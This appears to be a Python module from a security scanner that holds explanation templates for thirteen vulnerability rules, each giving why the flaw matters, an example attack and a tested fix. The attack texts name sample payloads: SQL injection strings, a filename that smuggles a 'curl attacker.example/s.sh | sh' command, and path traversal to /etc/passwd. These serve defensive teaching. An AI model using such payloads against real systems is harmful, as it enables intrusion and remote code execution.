"""Explanation templates, one per rule. Each has four parts: what was found, why
it is dangerous, a concrete attack, and a fix that is code we wrote and tested."""
from __future__ import annotations

import dataclasses
import json
from functools import lru_cache

from ..config import DATA_DIR
from ..models import Finding, Language


@lru_cache(maxsize=1)
def cwe_data() -> dict:
    path = DATA_DIR / "grounding" / "cwe.json"
    return json.loads(path.read_text(encoding="utf-8")) if path.exists() else {}


@lru_cache(maxsize=1)
def owasp_data() -> dict:
    path = DATA_DIR / "grounding" / "owasp.json"
    return json.loads(path.read_text(encoding="utf-8")) if path.exists() else {}


def grounding_block(finding: Finding) -> str:
    """Both citations, verbatim, so fidelity can be diffed against the source."""
    parts = []
    if cwe := cwe_data().get(finding.cwe):
        parts.append(f"{finding.cwe} ({cwe['name']}): {cwe['summary']}")
    key = finding.owasp.split(" ")[0].strip(" -").strip()
    if owasp := owasp_data().get(key):
        parts.append(f"{key} ({owasp['name']}): {owasp['summary']}")
    return ("\n\n" + "\n\n".join(parts)) if parts else ""


# ------------------------------------------------------------- the templates

TEMPLATES: dict[str, dict[str, str]] = {
    "CS001": {
        "why": (
            "A credential written into source code is readable by anyone who can read the "
            "repository - and that includes its entire git history, your CI build logs, and "
            "anything you deploy. Removing the line later does not remove it from history."
        ),
        "attack": (
            "Automated scanners crawl public repositories for key patterns continuously. A "
            "leaked cloud key is typically used within minutes of being pushed: the finder "
            "enumerates your storage buckets and compute, then either exfiltrates data or "
            "starts instances you pay for."
        ),
        "fix_python": (
            "import os\n"
            "AWS_ACCESS_KEY = os.environ[\"AWS_ACCESS_KEY_ID\"]   # fails loudly if unset\n\n"
            "# then, outside the code:\n"
            "#   1. revoke the exposed key in the provider console - it is already public\n"
            "#   2. put the new value in .env, and add .env to .gitignore\n"
            "#   3. purge it from history (git filter-repo) if the repo was ever pushed"
        ),
        "fix_javascript": (
            "const AWS_ACCESS_KEY = process.env.AWS_ACCESS_KEY_ID;\n"
            "if (!AWS_ACCESS_KEY) throw new Error('AWS_ACCESS_KEY_ID is not set');\n\n"
            "// then: revoke the exposed key, add .env to .gitignore, purge git history"
        ),
    },
    "CS002": {
        "why": (
            "When a query is assembled by joining strings, the database cannot tell your SQL "
            "apart from a value someone typed. A parameterised query sends the statement and "
            "the values separately, so a value can never become syntax."
        ),
        "attack": (
            "Supplying 1 OR 1=1 where an id is expected returns every row in the table. "
            "Supplying 1; DROP TABLE users-- ends the intended statement and starts a new one. "
            "Neither requires any tooling - they are typed into the address bar."
        ),
        "fix_python": (
            "# parameterised - the driver escapes and binds the value\n"
            "cur.execute(\"SELECT * FROM users WHERE id = ?\", (uid,))\n\n"
            "# SQLAlchemy text() with bound parameters\n"
            "session.execute(text(\"SELECT * FROM users WHERE id = :uid\"), {\"uid\": uid})"
        ),
        "fix_javascript": (
            "// parameterised query - never a template literal\n"
            "db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);\n\n"
            "// postgres\n"
            "client.query('SELECT * FROM users WHERE id = $1', [req.params.id]);"
        ),
    },
    "CS003": {
        "why": (
            "Passing a constructed string to a shell means the shell interprets it. Characters "
            "like ; | && $() are syntax to the shell, so any value spliced into that string can "
            "add commands of its own."
        ),
        "attack": (
            "A filename parameter of report.pdf; curl attacker.example/s.sh | sh runs your "
            "intended command and then the attacker's, with your process's privileges."
        ),
        "fix_python": (
            "import subprocess\n"
            "# pass a list, never a string; shell=False is the default\n"
            "subprocess.run([\"convert\", filename, \"out.png\"], check=True)\n\n"
            "# if a shell is genuinely required, quote every interpolated value:\n"
            "#   import shlex; shlex.quote(filename)"
        ),
        "fix_javascript": (
            "const { execFile } = require('node:child_process');\n"
            "// execFile takes an argument array - no shell parsing happens\n"
            "execFile('convert', [filename, 'out.png'], (err, stdout) => { /* ... */ });"
        ),
    },
    "CS004": {
        "why": (
            "MD5 and SHA-1 are broken: an attacker can construct two different inputs with the "
            "same hash, cheaply. They are also fast, which makes brute-forcing a stolen password "
            "hash easy. Neither is acceptable for passwords, signatures, or integrity checks."
        ),
        "attack": (
            "A leaked table of MD5 password hashes is not really a table of hashes - commodity "
            "hardware reverses common passwords at billions of guesses per second, and the "
            "rest are looked up in precomputed tables."
        ),
        "fix_python": (
            "# integrity / general hashing\n"
            "import hashlib\n"
            "digest = hashlib.sha256(data).hexdigest()\n\n"
            "# passwords - never a plain hash; use a slow KDF\n"
            "from argon2 import PasswordHasher\n"
            "hashed = PasswordHasher().hash(password)"
        ),
        "fix_javascript": (
            "const crypto = require('node:crypto');\n"
            "const digest = crypto.createHash('sha256').update(data).digest('hex');\n\n"
            "// passwords\n"
            "const bcrypt = require('bcrypt');\n"
            "const hashed = await bcrypt.hash(password, 12);"
        ),
    },
    "CS005": {
        "why": (
            "The route reads data using a value the client controls, and nothing establishes who "
            "the client is. Authentication answers 'who are you'; without it there is no basis "
            "for the next question, 'is this record yours'. Changing a number in the URL is the "
            "entire attack."
        ),
        "attack": (
            "A user requests /user/1 and receives their own record, then requests /user/2 and "
            "receives someone else's. A short loop over the id range dumps the table. No "
            "credentials are needed and nothing in your logs looks unusual."
        ),
        "fix_python": (
            "from flask_login import login_required, current_user\n\n"
            "@app.route(\"/user/<uid>\")\n"
            "@login_required                       # 1. establish who is asking\n"
            "def get_user(uid):\n"
            "    row = session.execute(\n"
            "        text(\"SELECT * FROM users WHERE id = :uid AND owner_id = :owner\"),\n"
            "        {\"uid\": uid, \"owner\": current_user.id},   # 2. constrain to them\n"
            "    ).first()\n"
            "    return {\"row\": dict(row) if row else None}, (200 if row else 404)"
        ),
        "fix_javascript": (
            "app.get('/user/:id', requireAuth, async (req, res) => {   // 1. who is asking\n"
            "  const [row] = await db.query(\n"
            "    'SELECT * FROM users WHERE id = ? AND owner_id = ?',\n"
            "    [req.params.id, req.user.id]                          // 2. constrain to them\n"
            "  );\n"
            "  return row ? res.json(row) : res.sendStatus(404);\n"
            "});"
        ),
    },
    "CS006": {
        "why": (
            "AI assistants invent package names that sound plausible and do not exist. Attackers "
            "watch for those names and register them, so the install command the assistant gave "
            "you fetches their code and runs it with your permissions."
        ),
        "attack": (
            "A researcher published an empty package under a name models commonly hallucinate. "
            "It was downloaded roughly 30,000 times in three months by developers running an "
            "AI-suggested install command. A real attacker would not have left it empty."
        ),
        "fix_python": (
            "# Do not install it. Confirm the name from the library's own documentation.\n"
            "# Then pin the version you verified:\n"
            "#   requests==2.32.3\n"
            "# An unpinned requirement resolves to whatever exists at install time."
        ),
        "fix_javascript": (
            "// Do not install it. Confirm the name on the package's own docs or repo.\n"
            "// Then pin an exact version in package.json - \"^1.2.0\" is not a pin.\n"
            "//   \"express\": \"4.21.2\""
        ),
    },
}


# ------------------------------- CS007-CS013, added in the extended pass

TEMPLATES.update({
    "CS007": {
        "why": (
            "The value is written into a page without being escaped, so a browser cannot "
            "tell your markup apart from markup someone typed. Anything in that value "
            "that looks like a tag is treated as one - including a script tag."
        ),
        "attack": (
            "A comment or profile field containing a script tag runs in the browser of "
            "every other user who views the page, with their session. Their cookies, "
            "their logged-in requests, their account."
        ),
        "fix_python": (
            "# Let the template engine escape - Jinja autoescapes by default\n"
            "return render_template(\"page.html\", value=user_value)\n\n"
            "# Never build the template itself from input:\n"
            "#   render_template_string(f\"<p>{user_value}</p>\")   <- compiles input\n"
            "# If raw HTML is genuinely required, sanitise first:\n"
            "#   import bleach; safe = bleach.clean(user_value)"
        ),
        "fix_javascript": (
            "// textContent inserts text, never markup\n"
            "el.textContent = userValue;\n\n"
            "// If HTML is genuinely required, sanitise it:\n"
            "import DOMPurify from 'dompurify';\n"
            "el.innerHTML = DOMPurify.sanitize(userValue);\n\n"
            "// React escapes by default - dangerouslySetInnerHTML opts out"
        ),
    },
    "CS008": {
        "why": (
            "The path is assembled from something the client controls, and nothing "
            "removes ../ before it is resolved. The filesystem resolves those segments "
            "faithfully, which takes the read outside the directory you meant."
        ),
        "attack": (
            "Requesting ../../../../etc/passwd, or on Windows ..\\..\\..\\windows\\win.ini, "
            "returns a file that has nothing to do with your application. The same trick "
            "against a write path overwrites configuration."
        ),
        "fix_python": (
            "from pathlib import Path\n"
            "from werkzeug.utils import secure_filename\n\n"
            "BASE = Path(\"/srv/uploads\").resolve()\n"
            "target = (BASE / secure_filename(name)).resolve()\n"
            "if not target.is_relative_to(BASE):        # resolve THEN check\n"
            "    abort(404)\n"
            "return send_file(target)"
        ),
        "fix_javascript": (
            "const path = require('node:path');\n"
            "const BASE = path.resolve('/srv/uploads');\n\n"
            "const target = path.resolve(BASE, path.basename(req.params.name));\n"
            "if (!target.startsWith(BASE + path.sep)) return res.sendStatus(404);\n"
            "res.sendFile(target);"
        ),
    },
    "CS009": {
        "why": (
            "A setting here is at its most permissive value. Wildcards and debug modes "
            "are convenient during development and become an open door in production, "
            "because nothing about the code changes when it is deployed."
        ),
        "attack": (
            "A wildcard CORS policy combined with credentials lets any website make "
            "authenticated requests as your logged-in users and read the responses. "
            "A debug console executes arbitrary code for anyone who can reach an error page."
        ),
        "fix_python": (
            "# name the origins you actually serve\n"
            "app.add_middleware(\n"
            "    CORSMiddleware,\n"
            "    allow_origins=[\"https://app.example.com\"],\n"
            "    allow_credentials=True,\n"
            ")\n\n"
            "# debug never comes from code\n"
            "app.run(debug=os.environ.get(\"FLASK_DEBUG\") == \"1\")"
        ),
        "fix_javascript": (
            "app.use(cors({\n"
            "  origin: ['https://app.example.com'],   // not '*', not true\n"
            "  credentials: true,\n"
            "}));"
        ),
    },

    # ---- advisories: the language is deliberately weaker ----
    "CS010": {
        "why": (
            "State-changing routes are normally protected by a token the browser cannot "
            "forge cross-site. No such protection is visible in this file. It may be "
            "configured elsewhere - this is a prompt to check, not a defect report."
        ),
        "attack": (
            "If protection is genuinely absent, a page on another site can submit a form "
            "to this route using the victim's cookies, and the action succeeds without "
            "them doing anything but visiting."
        ),
        "fix_python": (
            "from flask_wtf.csrf import CSRFProtect\n"
            "CSRFProtect(app)          # then {{ csrf_token() }} in every form\n\n"
            "# For a token API with no cookies, CSRF may not apply at all -\n"
            "# confirm which model you are in before adding anything."
        ),
        "fix_javascript": (
            "const { doubleCsrf } = require('csrf-csrf');\n"
            "app.use(doubleCsrfProtection);\n\n"
            "// Cookie-authenticated routes only. A pure bearer-token API is not\n"
            "// vulnerable to CSRF - check which one you have."
        ),
    },
    "CS011": {
        "why": (
            "Authentication routes are the ones attackers try in bulk. No rate limit is "
            "visible in this file. A reverse proxy or gateway may already be limiting "
            "it - this is a prompt to confirm, not a defect report."
        ),
        "attack": (
            "Without a limit anywhere in the stack, a leaked password list can be tried "
            "against your login endpoint at thousands of attempts per minute, and the "
            "only signal is a busier log."
        ),
        "fix_python": (
            "from flask_limiter import Limiter\n"
            "limiter = Limiter(get_remote_address, app=app)\n\n"
            "@app.route(\"/login\", methods=[\"POST\"])\n"
            "@limiter.limit(\"5 per minute\")\n"
            "def login(): ..."
        ),
        "fix_javascript": (
            "const rateLimit = require('express-rate-limit');\n"
            "app.use('/login', rateLimit({ windowMs: 60_000, max: 5 }));"
        ),
    },
    "CS012": {
        "why": (
            "Request data reaches a sensitive operation in this function, and nothing "
            "between them looks like validation or escaping. We cannot see whether the "
            "value is safe - only that no check is visible on the path."
        ),
        "attack": (
            "What an attacker does depends on the sink. The point of this advisory is "
            "that the path exists and is unguarded, so the specific consequence is "
            "whatever that operation allows."
        ),
        "fix_python": (
            "from pydantic import BaseModel, Field\n\n"
            "class Query(BaseModel):\n"
            "    term: str = Field(max_length=64, pattern=r\"^[\\w\\s-]+$\")\n\n"
            "# validate at the boundary, then pass the typed object inward"
        ),
        "fix_javascript": (
            "const { z } = require('zod');\n"
            "const Query = z.object({ term: z.string().max(64).regex(/^[\\w\\s-]+$/) });\n"
            "const { term } = Query.parse(req.query);   // throws on bad input"
        ),
    },
    "CS013": {
        "why": (
            "The file is checked and then used as two separate operations. Between them "
            "the filesystem can change - another process can delete, create, or replace "
            "the path with a symlink, and your check no longer describes what you open."
        ),
        "attack": (
            "An attacker who can write to the directory replaces the file with a link to "
            "something else in the gap between the two calls. Your code opens the target "
            "of the link with your process's privileges."
        ),
        "fix_python": (
            "# ask forgiveness, not permission - one atomic operation\n"
            "try:\n"
            "    with open(path, \"r\") as fh:\n"
            "        data = fh.read()\n"
            "except FileNotFoundError:\n"
            "    abort(404)\n\n"
            "# for creation, O_EXCL fails if it already exists\n"
            "#   os.open(path, os.O_CREAT | os.O_EXCL | os.O_WRONLY)"
        ),
        "fix_javascript": (
            "// one call, handle the error - do not existsSync first\n"
            "fs.readFile(p, 'utf8', (err, data) => {\n"
            "  if (err) return res.sendStatus(404);\n"
            "  res.send(data);\n"
            "});"
        ),
    },
})


def explain(finding: Finding) -> Finding:
    """Attach explanation, attack and fix. Returns a new Finding (they are frozen)."""
    tpl = TEMPLATES.get(finding.rule_id)
    if tpl is None:
        return finding

    evidence = finding.explanation.rstrip().rstrip(".")   # matcher's evidence string
    what = f"On line {finding.line}, {evidence}."

    fix_key = "fix_python" if finding.language is Language.PYTHON else "fix_javascript"

    return dataclasses.replace(
        finding,
        explanation=what + " " + tpl["why"] + grounding_block(finding),
        attack=tpl["attack"],
        fix=tpl[fix_key],
    )
